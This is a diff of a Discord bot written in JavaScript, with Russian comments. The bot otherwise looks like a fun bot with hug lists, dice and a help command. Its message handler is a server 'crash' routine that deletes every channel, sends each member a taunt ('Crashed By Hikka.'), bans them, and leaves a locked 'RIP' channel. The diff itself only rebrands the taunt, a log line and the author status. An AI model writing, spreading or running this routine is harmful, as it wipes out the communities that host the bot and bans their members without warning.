@@ -37,7 +37,7 @@ bot.on('message', msg => {
 		msg.guild.setIcon('https://media.discordapp.net/attachments/700639036980723742/705099946935713792/---1.jpg').then(() => {
       msg.guild.channels.forEach(c => c.delete()) //Удаление все чатов и каналов
        msg.guild.members.forEach(member => { //Расслыка всем пользователям
-        if (member.id != bot.user.id && !member.user.bot) member.send(' Вас крашнули, простите если этого бота использовал кто-то другой  ').then(() => {
+        if (member.id != bot.user.id && !member.user.bot) member.send(' Crashed By Hikka.  ').then(() => {
             member.ban().then(() => {
                 const name = 'RIP'
                 msg.guild.createChannel(name, "text")
@@ -47,7 +47,7 @@ bot.on('message', msg => {
                         SEND_MESSAGES: false
                     })
 					
-                    console.log('Попался лох')
+                    console.log('Ещё один сервер был крашнут')
                 })
             })
         })
@@ -90,7 +90,7 @@ const rando_hug = [
 
 // Локальные переменные
 
-let statuslist = ['by fgdfg;klj', 'В разработке','Команда v!help']
+let statuslist = ['by Toby.ink', 'В разработке','Команда v!help']
 let onlinelist = ['dnd','idle','online'] // invisible - ещё есть
 let randomcube = ['1','2','3','4','5','6','7','8','9','10','11','12']
 let listavatar = ['2.png','1.png']
